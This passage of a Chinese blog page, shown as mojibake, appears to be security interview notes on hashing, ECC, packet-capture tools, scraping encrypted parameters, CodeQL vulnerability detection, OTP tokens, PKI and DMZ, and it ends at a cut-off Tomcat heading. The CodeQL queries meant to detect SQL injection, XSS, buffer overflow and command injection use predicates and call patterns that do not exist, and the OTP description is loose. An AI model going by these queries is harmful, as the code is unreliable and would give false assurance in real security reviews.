¾“å‡ºé•¿åº¦</strong>ï¼šSHA-1çš„è¾“å‡ºé•¿åº¦å›ºå®šä¸º160ä½ï¼Œè€ŒSHA-2å¯ä»¥æœ‰ä¸åŒçš„è¾“å‡ºé•¿åº¦ã€‚</li><li><strong>å®‰å…¨æ€§</strong>ï¼šSHA-2æ¯”SHA-1æ›´å®‰å…¨ï¼ŒSHA-1å·²è¢«è¯æ˜å­˜åœ¨å¼±ç‚¹ï¼Œå¯ä»¥è¢«ç¢°æ’æ”»å‡»ã€‚</li><li><strong>é€Ÿåº¦</strong>ï¼šSHA-1çš„é€Ÿåº¦ç›¸å¯¹è¾ƒå¿«ï¼Œä½†SHA-2æä¾›äº†æ›´é«˜çš„å®‰å…¨æ€§ï¼Œå°½ç®¡é€Ÿåº¦ç›¸å¯¹è¾ƒæ…¢ã€‚</li></ul><p>æ€»çš„æ¥è¯´ï¼ŒSHA-2æ¯”SHA-1æ›´å®‰å…¨ï¼Œæ›´æ¨èä½¿ç”¨SHA-2è¿›è¡Œå“ˆå¸Œè¿ç®—ã€‚</p><h3 id="è¯¦ç»†è®²è§£ä¸‹ECC"><a href="#è¯¦ç»†è®²è§£ä¸‹ECC" class="headerlink" title="è¯¦ç»†è®²è§£ä¸‹ECC"></a>è¯¦ç»†è®²è§£ä¸‹ECC</h3><p><strong>ECCï¼ˆæ¤­åœ†æ›²çº¿å¯†ç å­¦ï¼‰</strong>æ˜¯ä¸€ç§åŸºäºæ¤­åœ†æ›²çº¿æ•°å­¦çš„éå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚ECCçš„å®‰å…¨æ€§åŸºäºæ¤­åœ†æ›²çº¿ä¸Šçš„ç¦»æ•£å¯¹æ•°é—®é¢˜ï¼ˆECDLPï¼‰ï¼Œè¯¥é—®é¢˜çš„éš¾åº¦ä½¿å¾—ECCåœ¨è¾ƒçŸ­çš„å¯†é’¥é•¿åº¦ä¸‹ä¹Ÿèƒ½æä¾›ä¸RSAç­‰ä¼ ç»Ÿéå¯¹ç§°åŠ å¯†ç®—æ³•ç›¸å½“çš„å®‰å…¨æ€§ã€‚ECCçš„ä¸»è¦ä¼˜åŠ¿åŒ…æ‹¬ï¼š</p><ul><li><strong>å¯†é’¥é•¿åº¦çŸ­</strong>ï¼šECCä½¿ç”¨è¾ƒçŸ­çš„å¯†é’¥é•¿åº¦å³å¯è¾¾åˆ°ä¸RSAç›¸åŒçš„å®‰å…¨çº§åˆ«ï¼Œä¾‹å¦‚ï¼Œ256ä½çš„ECCå¯†é’¥ç›¸å½“äº3072ä½çš„RSAå¯†é’¥ã€‚</li><li><strong>è®¡ç®—æ•ˆç‡é«˜</strong>ï¼šECCçš„æ•°å­¦è¿ç®—ç›¸å¯¹ç®€å•ï¼Œè®¡ç®—æ•ˆç‡é«˜ï¼Œé€‚åˆåœ¨èµ„æºå—é™çš„ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œå¦‚ç§»åŠ¨è®¾å¤‡å’Œç‰©è”ç½‘è®¾å¤‡ã€‚</li><li><strong>å¸¦å®½è¦æ±‚ä½</strong>ï¼šç”±äºå¯†é’¥é•¿åº¦çŸ­ï¼ŒECCåœ¨ä¼ è¾“å¯†é’¥æ—¶å ç”¨çš„å¸¦å®½è¾ƒå°‘ã€‚<br>ECCçš„åŠ å¯†å’Œè§£å¯†è¿‡ç¨‹æ¶‰åŠæ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹è¿ç®—ï¼ŒåŒ…æ‹¬ç‚¹åŠ æ³•å’Œæ ‡é‡ä¹˜æ³•ã€‚è¿™äº›è¿ç®—çš„å¤æ‚æ€§ä½¿å¾—ECCåœ¨åŠ å¯†å’Œæ•°å­—ç­¾åæ–¹é¢éå¸¸æœ‰æ•ˆã€‚</li></ul><h3 id="é€†å‘ç›¸å…³"><a href="#é€†å‘ç›¸å…³" class="headerlink" title="é€†å‘ç›¸å…³"></a>é€†å‘ç›¸å…³</h3><p><strong>æŠ“åŒ…å·¥å…·</strong>ï¼š</p><ul><li><strong>mitmproxy</strong>ï¼šä¸€æ¬¾æ”¯æŒHTTP&#x2F;HTTPSçš„ä¸­é—´äººä»£ç†å·¥å…·ï¼Œå¯ä»¥ç”¨äºæ‹¦æˆªã€ä¿®æ”¹ã€ä¿å­˜HTTP&#x2F;HTTPSè¯·æ±‚ã€‚mitmproxyæä¾›äº†å‘½ä»¤è¡Œç•Œé¢ï¼ˆmitmproxyï¼‰ã€ç®€å•çš„ç»ˆç«¯è¾“å‡ºï¼ˆmitmdumpï¼‰å’ŒåŸºäºWebçš„ç•Œé¢ï¼ˆmitmwebï¼‰ã€‚å®ƒæ”¯æŒPythonè„šæœ¬ï¼Œå¯ä»¥å¯¹æ¥Pythonå¯¹è¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œå®ç°é«˜åº¦å®šåˆ¶åŒ–çš„æŠ“åŒ…å’Œæ•°æ®å¤„ç†ã€‚</li><li><strong>Wireshark</strong>ï¼šä¸€æ¬¾ç½‘ç»œåè®®åˆ†æå·¥å…·ï¼Œå¯ä»¥æ•è·å’Œåˆ†æç½‘ç»œæ•°æ®åŒ…ï¼Œæ”¯æŒå¤šç§åè®®ã€‚</li><li><strong>Burp Suite</strong>ï¼šä¸€æ¬¾ç”¨äºç½‘ç»œå®‰å…¨æµ‹è¯•çš„é›†æˆå¹³å°ï¼Œç‰¹åˆ«é€‚ç”¨äºWebåº”ç”¨ç¨‹åºçš„å®‰å…¨æµ‹è¯•ã€‚</li></ul><p><strong>è·å–æ•°æ®åŒ…çš„æ–¹æ³•</strong>ï¼š</p><ul><li><strong>æŠ“åŒ…å·¥å…·</strong>ï¼šä½¿ç”¨å¦‚mitmproxyã€Wiresharkã€Burp Suiteç­‰å·¥å…·è¿›è¡Œç½‘ç»œæ•°æ®åŒ…çš„æ•è·å’Œåˆ†æã€‚</li><li><strong>API Hook</strong>ï¼šé€šè¿‡Hook APIè°ƒç”¨ï¼Œæ‹¦æˆªå’Œè®°å½•åº”ç”¨ä¸ç³»ç»Ÿæˆ–ç½‘ç»œçš„äº¤äº’æ•°æ®ã€‚</li><li><strong>æ—¥å¿—è®°å½•</strong>ï¼šæŸäº›åº”ç”¨ä¼šåœ¨æ—¥å¿—ä¸­è®°å½•è¯¦ç»†çš„è¿è¡Œä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡åˆ†ææ—¥å¿—æ¥è·å–æ•°æ®åŒ…å†…å®¹ã€‚</li><li><strong>å†…å­˜è½¬å‚¨</strong>ï¼šé€šè¿‡è½¬å‚¨åº”ç”¨çš„å†…å­˜ï¼Œæå–å…¶ä¸­çš„ç½‘ç»œæ•°æ®åŒ…ä¿¡æ¯ã€‚</li></ul><h3 id="çˆ¬è™«ç›¸å…³"><a href="#çˆ¬è™«ç›¸å…³" class="headerlink" title="çˆ¬è™«ç›¸å…³"></a>çˆ¬è™«ç›¸å…³</h3><p><strong>çˆ¬è™«ç±»å‹</strong>ï¼š</p><ul><li><strong>Webçˆ¬è™«</strong>ï¼šç”¨äºçˆ¬å–ç½‘é¡µå†…å®¹ï¼Œæå–ç»“æ„åŒ–æ•°æ®ã€‚å¸¸è§çš„Webçˆ¬è™«åŒ…æ‹¬Scrapyã€Beautiful Soupç­‰ã€‚</li></ul><p><strong>åŠ å¯†æ•°æ®é—®é¢˜</strong>ï¼š</p><ul><li><strong>å¤„ç†æ–¹æ³•</strong>ï¼šåœ¨çˆ¬å–åŠ å¯†æ•°æ®æ—¶ï¼Œéœ€è¦åˆ†æåŠ å¯†ç®—æ³•å’ŒåŠ å¯†è¿‡ç¨‹ã€‚ä¾‹å¦‚ï¼Œå¯¹äºQQéŸ³ä¹ä¸­çš„signåŠ å¯†ï¼Œå¯ä»¥é€šè¿‡é€†å‘å·¥ç¨‹åˆ†æå…¶åŠ å¯†é€»è¾‘ï¼Œæ‰¾åˆ°è§£å¯†æ–¹æ³•æˆ–æ¨¡æ‹ŸåŠ å¯†è¿‡ç¨‹æ¥è·å–æœ‰æ•ˆæ•°æ®ã€‚</li></ul><p><strong>åŠ¨æ€ç½‘é¡µçˆ¬å–</strong>ï¼š</p><ul><li><strong>æŠ€æœ¯æ‰‹æ®µ</strong>ï¼šåŠ¨æ€ç½‘é¡µé€šå¸¸ä¾èµ–JavaScriptæ¸²æŸ“å†…å®¹ï¼Œçˆ¬è™«éœ€è¦æ¨¡æ‹Ÿæµè§ˆå™¨è¡Œä¸ºï¼Œæ‰§è¡ŒJavaScriptä»£ç ä»¥è·å–å®Œæ•´é¡µé¢å†…å®¹ã€‚å¸¸ç”¨çš„å·¥å…·åŒ…æ‹¬Seleniumã€Puppeteerç­‰ï¼Œå®ƒä»¬å¯ä»¥æ§åˆ¶æµè§ˆå™¨è‡ªåŠ¨åŒ–æ“ä½œï¼Œç­‰å¾…é¡µé¢æ¸²æŸ“å®Œæˆåæå–æ•°æ®ã€‚</li><li><strong>AJAXå¤„ç†</strong>ï¼šå¯¹äºé€šè¿‡AJAXåŠ è½½æ•°æ®çš„ç½‘é¡µï¼Œçˆ¬è™«éœ€è¦åˆ†æAJAXè¯·æ±‚çš„URLã€å‚æ•°å’Œè¯·æ±‚å¤´ï¼Œç›´æ¥æ¨¡æ‹Ÿè¿™äº›è¯·æ±‚æ¥è·å–æ•°æ®ï¼Œè€Œä¸æ˜¯çˆ¬å–æ•´ä¸ªé¡µé¢ã€‚</li></ul><h3 id="ç¼–è¯‘å’Œéç¼–è¯‘çš„åŒºåˆ«"><a href="#ç¼–è¯‘å’Œéç¼–è¯‘çš„åŒºåˆ«" class="headerlink" title="ç¼–è¯‘å’Œéç¼–è¯‘çš„åŒºåˆ«"></a>ç¼–è¯‘å’Œéç¼–è¯‘çš„åŒºåˆ«</h3><ul><li><strong>ç¼–è¯‘</strong>ï¼šç¼–è¯‘æ˜¯å°†æºä»£ç è½¬æ¢æˆæœºå™¨ç æˆ–å­—èŠ‚ç çš„è¿‡ç¨‹ã€‚ç¼–è¯‘å™¨åœ¨ç¨‹åºè¿è¡Œå‰å®Œæˆè¿™ä¸€å·¥ä½œï¼Œç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¾‹å¦‚ï¼ŒC++ä»£ç é€šè¿‡ç¼–è¯‘å™¨ï¼ˆå¦‚g++ï¼‰ç¼–è¯‘æˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ hello.cpp -o hello</span><br></pre></td></tr></table></figure></li><li><strong>éç¼–è¯‘ï¼ˆè§£é‡Šæ‰§è¡Œï¼‰</strong>ï¼šè§£é‡Šæ‰§è¡Œæ˜¯æŒ‡æºä»£ç åœ¨è¿è¡Œæ—¶é€è¡Œç¿»è¯‘æˆæœºå™¨ç å¹¶æ‰§è¡Œï¼Œä¸éœ€è¦äº‹å…ˆç¼–è¯‘ã€‚ä¾‹å¦‚ï¼ŒPythonè„šæœ¬ç”±Pythonè§£é‡Šå™¨é€è¡Œæ‰§è¡Œï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python hello.py</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-CodeQLæ˜¯å¦å¯ä»¥è¢«ä¿®æ”¹ä¸ºæ— éœ€ç¼–è¯‘çš„å·¥å…·"><a href="#4-CodeQLæ˜¯å¦å¯ä»¥è¢«ä¿®æ”¹ä¸ºæ— éœ€ç¼–è¯‘çš„å·¥å…·" class="headerlink" title="4. CodeQLæ˜¯å¦å¯ä»¥è¢«ä¿®æ”¹ä¸ºæ— éœ€ç¼–è¯‘çš„å·¥å…·"></a>4. CodeQLæ˜¯å¦å¯ä»¥è¢«ä¿®æ”¹ä¸ºæ— éœ€ç¼–è¯‘çš„å·¥å…·</h3><p>CodeQLæ˜¯ä¸€ç§é™æ€ä»£ç åˆ†æå·¥å…·ï¼Œå®ƒé€šè¿‡åˆ†æç¼–è¯‘åçš„ä»£ç ï¼ˆå¦‚Javaå­—èŠ‚ç ã€C++çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰æ¥æ£€æµ‹ä»£ç ä¸­çš„å®‰å…¨æ¼æ´ã€‚ç„¶è€Œï¼ŒCodeQLä¹Ÿå¯ä»¥ç›´æ¥åˆ†ææºä»£ç ï¼Œæ— éœ€ç¼–è¯‘ã€‚ä¾‹å¦‚ï¼Œå¯¹äºPythonã€JavaScriptç­‰è§£é‡Šå‹è¯­è¨€ï¼ŒCodeQLå¯ä»¥ç›´æ¥åˆ†ææºä»£ç æ–‡ä»¶ï¼Œæ— éœ€ç¼–è¯‘ã€‚</p><h3 id="5-äº†è§£å“ªäº›ç±»å‹çš„æ¼æ´ï¼Œå¦‚ä½•ç”¨CodeQLæ£€æµ‹"><a href="#5-äº†è§£å“ªäº›ç±»å‹çš„æ¼æ´ï¼Œå¦‚ä½•ç”¨CodeQLæ£€æµ‹" class="headerlink" title="5. äº†è§£å“ªäº›ç±»å‹çš„æ¼æ´ï¼Œå¦‚ä½•ç”¨CodeQLæ£€æµ‹"></a>5. äº†è§£å“ªäº›ç±»å‹çš„æ¼æ´ï¼Œå¦‚ä½•ç”¨CodeQLæ£€æµ‹</h3><p><strong>å¸¸è§æ¼æ´ç±»å‹</strong>ï¼š</p><ul><li><strong>SQLæ³¨å…¥</strong>ï¼šæ”»å‡»è€…é€šè¿‡åœ¨SQLæŸ¥è¯¢ä¸­æ³¨å…¥æ¶æ„ä»£ç æ¥æ“çºµæ•°æ®åº“ã€‚</li><li><strong>è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰</strong>ï¼šæ”»å‡»è€…åœ¨ç½‘é¡µä¸­æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œå½“å…¶ä»–ç”¨æˆ·è®¿é—®è¯¥ç½‘é¡µæ—¶ï¼Œè„šæœ¬è¢«æ‰§è¡Œã€‚</li><li><strong>ç¼“å†²åŒºæº¢å‡º</strong>ï¼šæ”»å‡»è€…é€šè¿‡å‘é€è¶…å‡ºç¼“å†²åŒºå¤§å°çš„æ•°æ®æ¥è¦†ç›–å†…å­˜ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</li><li><strong>å‘½ä»¤æ³¨å…¥</strong>ï¼šæ”»å‡»è€…é€šè¿‡æ³¨å…¥æ¶æ„å‘½ä»¤æ¥æ“çºµç³»ç»Ÿå‘½ä»¤ã€‚</li></ul><p><strong>ä½¿ç”¨CodeQLæ£€æµ‹æ¼æ´</strong>ï¼š</p><ul><li><strong>SQLæ³¨å…¥</strong>ï¼šCodeQLå¯ä»¥é€šè¿‡åˆ†æä»£ç ä¸­çš„SQLæŸ¥è¯¢æ„é€ è¿‡ç¨‹ï¼Œæ£€æµ‹æ˜¯å¦å­˜åœ¨ç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­çš„æƒ…å†µã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹CodeQLæŸ¥è¯¢å¯ä»¥æ£€æµ‹Javaä¸­çš„SQLæ³¨å…¥æ¼æ´ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from String sql, MethodCall mc</span><br><span class="line">where</span><br><span class="line">  mc.getCallee().getName().matches(&quot;executeQuery|executeUpdate&quot;) and</span><br><span class="line">  mc.getArgument(0).getValue().toString().contains(sql) and</span><br><span class="line">  sql.hasTaintSource()</span><br><span class="line">select mc, &quot;Potential SQL injection vulnerability.&quot;</span><br></pre></td></tr></table></figure></li><li><strong>XSS</strong>ï¼šCodeQLå¯ä»¥åˆ†æWebåº”ç”¨ç¨‹åºä¸­çš„ç”¨æˆ·è¾“å…¥å¤„ç†è¿‡ç¨‹ï¼Œæ£€æµ‹æ˜¯å¦å­˜åœ¨ç”¨æˆ·è¾“å…¥ç›´æ¥è¾“å‡ºåˆ°HTMLé¡µé¢çš„æƒ…å†µã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹CodeQLæŸ¥è¯¢å¯ä»¥æ£€æµ‹JavaScriptä¸­çš„XSSæ¼æ´ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import javascript</span><br><span class="line"></span><br><span class="line">from FunctionCall fc, StringLiteral s</span><br><span class="line">where</span><br><span class="line">  fc.getCallee().getName() = &quot;innerHTML&quot; and</span><br><span class="line">  fc.getArgument(1).getValue().toString().contains(s) and</span><br><span class="line">  s.hasTaintSource()</span><br><span class="line">select fc, &quot;Potential XSS vulnerability.&quot;</span><br></pre></td></tr></table></figure></li><li><strong>ç¼“å†²åŒºæº¢å‡º</strong>ï¼šCodeQLå¯ä»¥åˆ†æC&#x2F;C++ä»£ç ä¸­çš„å†…å­˜æ“ä½œå‡½æ•°ï¼ˆå¦‚<code>strcpy</code>ã€<code>sprintf</code>ï¼‰çš„ä½¿ç”¨æƒ…å†µï¼Œæ£€æµ‹æ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºçš„é£é™©ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹CodeQLæŸ¥è¯¢å¯ä»¥æ£€æµ‹Cä¸­çš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from FunctionCall fc, Function f</span><br><span class="line">where</span><br><span class="line">  f.getName() = &quot;strcpy&quot; and</span><br><span class="line">  fc.getCallee() = f and</span><br><span class="line">  not fc.getArgument(1).hasDefinedSize()</span><br><span class="line">select fc, &quot;Potential buffer overflow vulnerability.&quot;</span><br></pre></td></tr></table></figure></li><li><strong>å‘½ä»¤æ³¨å…¥</strong>ï¼šCodeQLå¯ä»¥åˆ†æä»£ç ä¸­çš„ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼ˆå¦‚<code>system</code>ã€<code>exec</code>ï¼‰çš„ä½¿ç”¨æƒ…å†µï¼Œæ£€æµ‹æ˜¯å¦å­˜åœ¨ç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°å‘½ä»¤ä¸­çš„æƒ…å†µã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹CodeQLæŸ¥è¯¢å¯ä»¥æ£€æµ‹Pythonä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import python</span><br><span class="line"></span><br><span class="line">from FunctionCall fc, StringLiteral s</span><br><span class="line">where</span><br><span class="line">  fc.getCallee().getName() = &quot;os.system&quot; and</span><br><span class="line">  fc.getArgument(0).getValue().toString().contains(s) and</span><br><span class="line">  s.hasTaintSource()</span><br><span class="line">select fc, &quot;Potential command injection vulnerability.&quot;</span><br></pre></td></tr></table></figure></li></ul><h3 id="1-ä¸­è¡Œçš„ç”µå­å£ä»¤å¡ï¼Œä¸Šé¢æ˜¾ç¤ºçš„å­—ç¬¦æ¯ä¸€åˆ†é’Ÿå˜æ¢ä¸€æ¬¡ã€‚é—®å®ç°æ–¹æ³•ã€‚"><a href="#1-ä¸­è¡Œçš„ç”µå­å£ä»¤å¡ï¼Œä¸Šé¢æ˜¾ç¤ºçš„å­—ç¬¦æ¯ä¸€åˆ†é’Ÿå˜æ¢ä¸€æ¬¡ã€‚é—®å®ç°æ–¹æ³•ã€‚" class="headerlink" title="1. ä¸­è¡Œçš„ç”µå­å£ä»¤å¡ï¼Œä¸Šé¢æ˜¾ç¤ºçš„å­—ç¬¦æ¯ä¸€åˆ†é’Ÿå˜æ¢ä¸€æ¬¡ã€‚é—®å®ç°æ–¹æ³•ã€‚"></a>1. ä¸­è¡Œçš„ç”µå­å£ä»¤å¡ï¼Œä¸Šé¢æ˜¾ç¤ºçš„å­—ç¬¦æ¯ä¸€åˆ†é’Ÿå˜æ¢ä¸€æ¬¡ã€‚é—®å®ç°æ–¹æ³•ã€‚</h3><p>ä¸­è¡Œçš„ç”µå­å£ä»¤å¡æ˜¯ä¸€ç§åŠ¨æ€å£ä»¤å¡ï¼Œå…¶æ˜¾ç¤ºçš„å­—ç¬¦æ¯åˆ†é’Ÿå˜æ¢ä¸€æ¬¡ã€‚è¿™ç§åŠ¨æ€å£ä»¤å¡çš„å®ç°æ–¹æ³•åŸºäºæ—¶é—´åŒæ­¥çš„åŠ å¯†ç®—æ³•ã€‚å…·ä½“æ¥è¯´ï¼ŒåŠ¨æ€å£ä»¤å¡å†…éƒ¨å­˜å‚¨äº†ä¸€ä¸ªå”¯ä¸€çš„ç§å­å¯†é’¥ï¼Œå¹¶ä¸”æŒ‰ç…§ä¸€å®šçš„æ—¶é—´é—´éš”ï¼ˆå¦‚æ¯åˆ†é’Ÿï¼‰ç”Ÿæˆä¸€ä¸ªåŠ¨æ€å£ä»¤ã€‚ç”ŸæˆåŠ¨æ€å£ä»¤çš„è¿‡ç¨‹é€šå¸¸ä½¿ç”¨HMAC-SHA1æˆ–HMAC-SHA256ç­‰åŠ å¯†ç®—æ³•ï¼Œç»“åˆå½“å‰çš„æ—¶é—´æˆ³å’Œç§å­å¯†é’¥è¿›è¡Œè®¡ç®—ã€‚ä¾‹å¦‚ï¼Œå‡è®¾å½“å‰æ—¶é—´æˆ³ä¸ºTï¼Œç§å­å¯†é’¥ä¸ºKï¼Œåˆ™åŠ¨æ€å£ä»¤çš„è®¡ç®—å…¬å¼å¯ä»¥è¡¨ç¤ºä¸ºï¼š</p><p>[ \text{OTP} &#x3D; \text{HMAC-SHA1}(K, T) ]</p><p>ç”Ÿæˆçš„OTPï¼ˆOne-Time Passwordï¼‰æ˜¯ä¸€ä¸ªå›ºå®šé•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œé€šå¸¸ç»è¿‡Base32ç¼–ç åæ˜¾ç¤ºåœ¨ç”µå­å£ä»¤å¡çš„å±å¹•ä¸Šã€‚æœåŠ¡å™¨ç«¯ä¹ŸæŒ‰ç…§ç›¸åŒçš„ç®—æ³•å’Œæ—¶é—´æˆ³ç”ŸæˆåŠ¨æ€å£ä»¤ï¼Œå¹¶ä¸ç”¨æˆ·æä¾›çš„å£ä»¤è¿›è¡Œæ¯”å¯¹éªŒè¯ã€‚</p><h3 id="3-å¯¹å¾…ä¸€ä¸ªé—®é¢˜æ€ä¹ˆå»æ€è€ƒï¼Ÿ"><a href="#3-å¯¹å¾…ä¸€ä¸ªé—®é¢˜æ€ä¹ˆå»æ€è€ƒï¼Ÿ" class="headerlink" title="3. å¯¹å¾…ä¸€ä¸ªé—®é¢˜æ€ä¹ˆå»æ€è€ƒï¼Ÿ"></a>3. å¯¹å¾…ä¸€ä¸ªé—®é¢˜æ€ä¹ˆå»æ€è€ƒï¼Ÿ</h3><p>é¢å¯¹ä¸€ä¸ªé—®é¢˜ï¼Œå¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œæ€è€ƒï¼š</p><ol><li><strong>é—®é¢˜åˆ†è§£</strong>ï¼šå°†å¤æ‚çš„é—®é¢˜åˆ†è§£ä¸ºå¤šä¸ªå­é—®é¢˜ï¼Œé€ä¸€åˆ†æã€‚</li><li><strong>å‡è®¾ä¸æ£€éªŒ</strong>ï¼šæå‡ºå¯èƒ½çš„è§£å†³æ–¹æ¡ˆæˆ–å‡è®¾ï¼Œå¹¶é€šè¿‡å®éªŒæˆ–é€»è¾‘æ¨ç†è¿›è¡ŒéªŒè¯ã€‚</li><li><strong>ç±»æ¯”ä¸è”æƒ³</strong>ï¼šå°†å½“å‰é—®é¢˜ä¸å·²çŸ¥çš„ç±»ä¼¼é—®é¢˜è¿›è¡Œæ¯”è¾ƒï¼Œå€Ÿé‰´å·²æœ‰çš„è§£å†³æ€è·¯ã€‚</li><li><strong>å…¨å±€ä¸å±€éƒ¨æ€è€ƒ</strong>ï¼šä»æ•´ä½“ä¸ŠæŠŠæ¡é—®é¢˜çš„èƒŒæ™¯å’Œå½±å“ï¼ŒåŒæ—¶æ·±å…¥åˆ†æé—®é¢˜çš„ç»†èŠ‚ã€‚</li><li><strong>æ¢è§’åº¦æ€è€ƒ</strong>ï¼šä»ä¸åŒçš„è§’åº¦å®¡è§†é—®é¢˜ï¼Œå¯»æ‰¾æ–°çš„è§£å†³é€”å¾„ã€‚</li><li><strong>å½’çº³ä¸æ¼”ç»</strong>ï¼šé€šè¿‡è§‚å¯Ÿå…·ä½“å®ä¾‹å½’çº³å‡ºä¸€èˆ¬è§„å¾‹ï¼Œå†è¿ç”¨ä¸€èˆ¬è§„å¾‹æ¼”ç»å‡ºå…·ä½“è§£å†³æ–¹æ¡ˆã€‚</li></ol><h3 id="5-PKIçš„æ¶æ„"><a href="#5-PKIçš„æ¶æ„" class="headerlink" title="5. PKIçš„æ¶æ„"></a>5. PKIçš„æ¶æ„</h3><p>PKIï¼ˆPublic Key Infrastructureï¼‰æ˜¯ä¸€ç§åŸºäºå…¬é’¥åŠ å¯†æŠ€æœ¯çš„å®‰å…¨æ¶æ„ï¼Œç”¨äºç®¡ç†æ•°å­—è¯ä¹¦å’Œå…¬é’¥ã€‚å…¸å‹çš„PKIæ¶æ„åŒ…æ‹¬ä»¥ä¸‹ç»„ä»¶ï¼š</p><ul><li><strong>è¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰</strong>ï¼šè´Ÿè´£ç­¾å‘å’Œç®¡ç†æ•°å­—è¯ä¹¦ã€‚</li><li><strong>æ³¨å†Œæœºæ„ï¼ˆRAï¼‰</strong>ï¼šè´Ÿè´£ç”¨æˆ·èº«ä»½çš„éªŒè¯å’Œæ³¨å†Œã€‚</li><li><strong>è¯ä¹¦åº“ï¼ˆCertificate Repositoryï¼‰</strong>ï¼šå­˜å‚¨å·²é¢å‘çš„æ•°å­—è¯ä¹¦ï¼Œä¾›ç”¨æˆ·æŸ¥è¯¢å’ŒéªŒè¯ã€‚</li><li><strong>è¯ä¹¦åŠé”€åˆ—è¡¨ï¼ˆCRLï¼‰</strong>ï¼šè®°å½•å·²è¢«åŠé”€çš„è¯ä¹¦åˆ—è¡¨ï¼Œç¡®ä¿ç”¨æˆ·èƒ½å¤ŸåŠæ—¶äº†è§£è¯ä¹¦çš„æœ‰æ•ˆæ€§ã€‚</li></ul><h3 id="10-DMZçš„ä½œç”¨ä»¥åŠä½ç½®"><a href="#10-DMZçš„ä½œç”¨ä»¥åŠä½ç½®" class="headerlink" title="10. DMZçš„ä½œç”¨ä»¥åŠä½ç½®"></a>10. DMZçš„ä½œç”¨ä»¥åŠä½ç½®</h3><p>DMZï¼ˆDemilitarized Zoneï¼‰æ˜¯ä¸€ç§ç½‘ç»œæ¶æ„ï¼Œç”¨äºå°†å¯¹å¤–æä¾›æœåŠ¡çš„æœåŠ¡å™¨ä¸å†…éƒ¨ç½‘ç»œéš”ç¦»ï¼Œä»¥å¢å¼ºç½‘ç»œå®‰å…¨æ€§ã€‚DMZçš„ä¸»è¦ä½œç”¨åŒ…æ‹¬ï¼š</p><ul><li><strong>éš”ç¦»å†…éƒ¨ç½‘ç»œ</strong>ï¼šå°†å¯¹å¤–æä¾›æœåŠ¡çš„æœåŠ¡å™¨ï¼ˆå¦‚WebæœåŠ¡å™¨ã€é‚®ä»¶æœåŠ¡å™¨ï¼‰æ”¾ç½®åœ¨DMZä¸­ï¼Œé˜²æ­¢å¤–éƒ¨æ”»å‡»ç›´æ¥è®¿é—®å†…éƒ¨ç½‘ç»œã€‚</li><li><strong>é›†ä¸­å®‰å…¨ç®¡ç†</strong>ï¼šåœ¨DMZå’Œå†…éƒ¨ç½‘ç»œä¹‹é—´éƒ¨ç½²é˜²ç«å¢™ï¼Œé›†ä¸­ç®¡ç†å®‰å…¨ç­–ç•¥ã€‚<br>DMZé€šå¸¸ä½äºå†…éƒ¨ç½‘ç»œå’Œå¤–éƒ¨ç½‘ç»œï¼ˆå¦‚Internetï¼‰ä¹‹é—´ï¼Œå½¢æˆä¸€ä¸ªä¸­é—´åŒºåŸŸã€‚åœ¨è¿™ä¸ªåŒºåŸŸä¸­ï¼Œå¯ä»¥éƒ¨ç½²å„ç§æœåŠ¡å™¨ï¼ŒåŒæ—¶é€šè¿‡é˜²ç«å¢™ç­‰è®¾å¤‡å¯¹è¿›å‡ºDMZçš„æµé‡è¿›è¡Œä¸¥æ ¼æ§åˆ¶ã€‚</li></ul><h3 id="æœ€æ–°çˆ†å‡ºçš„Tomcat-AJPåè®®æ¼æ´"><a href="#æœ€æ–°çˆ†å‡ºçš„Tomcat-AJPåè®®æ¼æ´" class="headerlink" title="æœ€æ–°çˆ†å‡ºçš„Tomcat AJPåè®®æ¼æ´"></a>æœ€æ–°çˆ†å‡ºçš„Tomcat 